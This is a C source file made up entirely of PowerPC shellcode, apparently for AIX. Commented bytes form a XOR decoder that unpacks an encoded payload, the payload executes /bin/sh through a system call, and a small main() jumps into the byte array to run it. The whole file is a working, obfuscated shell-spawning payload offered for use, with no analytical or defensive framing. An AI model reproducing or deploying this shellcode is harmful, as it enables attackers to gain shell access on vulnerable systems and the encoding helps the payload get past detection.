char shellcode[] =
// decoder
"\x7d\xce\x72\x79"      //  xor.    %r14, %r14, %r14
"\x40\x82\xff\xfd"      //  bnel    .main
"\x7d\xe8\x02\xa6"      //  mflr    %r15
"\x39\xef\x01\x01"      //  addi    %r15, %r15, 0x101
"\x39\xef\xff\x37"      //  addi    %r15, %r15, -0xC9   # r15 point to start of real shellcode
"\x3a\x20\x01\x01"      //  li      %r17, 0x101
"\x38\x51\xff\xe1"      //  addi    %r2, %r17, -0x1F    # r2=0xe2 syscall number of sync.
"\x3a\x31\xff\x2f"      //  addi    %r17, %r17, -0xD1   # shellcode size

"\x7e\x51\x78\xae"      //  lbzx    %r18, %r17, %r15    # read a character
"\x6a\x53\xfe\xfe"      //  xori    %r19, %r18, 0xFEFE  # xor
"\x7e\x71\x79\xae"      //  stbx    %r19, %r17, %r15    # store a character
"\x36\x31\xff\xff"      //  subic.  %r17, %r17, 1
"\x40\x80\xff\xf0"      //  bne     Loop                # loop

"\x4c\xc6\x33\x42"      //  crorc   %cr6, %cr6, %cr6
"\x7d\xe8\x03\xa6"      //  mtlr    %r15                # lr=real shellcode address
"\x44\xff\xff\x02"      //  svca    0

// real shellcode
"\xc6\x91\xfe\xde"      //  addi    %r3, %r15, 32
"\x6e\x9f\x01\x06"      //  stw     %r3, -8(%r1)
"\x83\x3b\x8d\x86"      //  mr      %r5, %r14 
"\x6e\x5f\x01\x02"      //  stw     %r5, -4(%r1)
"\xc6\x7f\x01\x06"      //  subi    %r4, %r1, 8
"\xc6\xbe\xfe\xfb"      //  li      %r2, 5
"\xb2\x38\xcd\xbc"      //  crorc   %cr6, %cr6, %cr6
"\xba\xfe\xfe\xfc"      //  svca    0
"\xd1\x9c\x97\x90"      //  .byte   '/', 'b', 'i', 'n',
"\xd1\x8d\x96\xfe"      //          '/', 's', 'h', 0x0
;

int main() {
  int jump[2]={(int)shellcode,0};
  ((*(void (*)())jump)());
}
